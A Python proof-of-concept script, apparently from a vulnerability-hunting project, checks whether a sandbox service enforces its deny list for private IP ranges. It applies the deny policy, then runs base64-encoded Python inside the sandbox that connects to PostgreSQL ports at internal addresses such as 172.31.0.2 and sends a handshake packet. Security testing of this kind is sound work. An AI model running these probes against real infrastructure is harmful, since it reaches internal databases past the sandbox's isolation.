# -*- coding: utf-8 -*-
"""N-line extension: deny ALL private/reserved ranges at once -> data-layer verification (multi-CIDR)
Confirms deniedCIDRs is not enforced for any private range (172.31/16, 10/8, 100.64/10, 192.168/16, 169.254/16)
"""
import base64, json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, 'status:', d['sandbox'].get('status'), flush=True)
    time.sleep(5)

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

def run_b64(code, tag):
    b64 = base64.b64encode(code.encode()).decode()
    sc = 'echo %s | base64 -d | python3' % b64
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=30000)
    out = parse_data(r).strip()
    print('[%s] %s' % (tag, out[:150]), flush=True)
    return out

# recover custom
api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM),
    {"mode": "custom", "allowedDomains": ["httpbin.org"]})
time.sleep(3)

# deny all private/reserved ranges (same config as _x_nfinal.py P1, plus readback)
body = {
    "mode": "custom",
    "allowedDomains": ["httpbin.org"],
    "deniedCIDRs": ["172.31.0.0/16", "10.0.0.0/8", "100.64.0.0/10", "192.168.0.0/16", "169.254.0.0/16"]
}
c, r = api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM), body)
print('set deny-all-private ->', c, r[:150], flush=True)
time.sleep(3)
c2, r2 = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
try:
    d2 = json.loads(r2)
    np = d2.get('session', {}).get('networkPolicy') or d2.get('sandbox', {}).get('networkPolicy')
    print('readback:', json.dumps(np), flush=True)
except Exception:
    pass

# data-layer probe: 172.31.0.2:5432 (core evidence)
PG_CODE = '''import socket,struct,time
s=socket.socket(); s.settimeout(4)
rc=s.connect_ex(('172.31.0.2',5432))
print('PG_CONNECT', rc)
if rc==0:
    s.sendall(struct.pack('!II',8,80877103))
    time.sleep(0.8)
    try:
        d=s.recv(4); print('PG_RESP', d)
    except Exception as e:
        print('PG_ERR', type(e).__name__)
'''
run_b64(PG_CODE, 'MULTI-deny-PG')

# additional: 10.0.0.2:5432 and 192.168.0.2:5432 (extended ranges)
for ip in ['10.0.0.2', '192.168.0.2', '100.64.0.2']:
    code = PG_CODE.replace("'172.31.0.2'", "'%s'" % ip)
    run_b64(code, 'MULTI-deny-%s-PG' % ip)

# public control: non-denied httpbin IP should still be reachable
sc = "curl -sk --max-time 8 --resolve httpbin.org:443:3.234.68.252 https://httpbin.org/anything 2>&1 | head -3"
c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=30000)
out = parse_data(r)
print('[MULTI-deny-curl-pub]', 'OK-200' if 'anything' in out or '"args"' in out else 'FAIL(%s)' % out[:60], flush=True)

print('=== N-MULTI DONE ===', flush=True)
